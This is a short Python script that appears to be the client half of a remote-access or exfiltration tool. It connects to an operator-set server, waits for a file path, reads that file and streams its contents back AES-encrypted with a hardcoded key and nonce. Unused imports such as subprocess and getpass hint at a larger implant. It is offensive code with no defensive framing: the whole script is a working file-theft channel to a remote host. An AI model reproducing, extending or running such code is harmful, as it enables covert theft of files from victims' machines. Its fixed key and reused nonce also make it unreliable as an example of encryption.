import socket,time
import platform
import getpass
import subprocess, threading


from Crypto.Cipher import AES

key = b'ZiyaGadimli12345'
nonce = b'ZiyaGadimli54321'

ciper = AES.new(key, AES.MODE_EAX, nonce)


SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

print("[+] Connected to server")


def download():
    file_path = s.recv(4096).decode()
    file = open(file_path, 'rb')
    a = file.read(4096)
    a = ciper.encrypt(a)
    while a:
        s.send(a)
        a = file.read(4096)
        a = ciper.encrypt(a)
    time.sleep(1)
    s.send(ciper.encrypt(b'\n\r'))
    file.close()


download()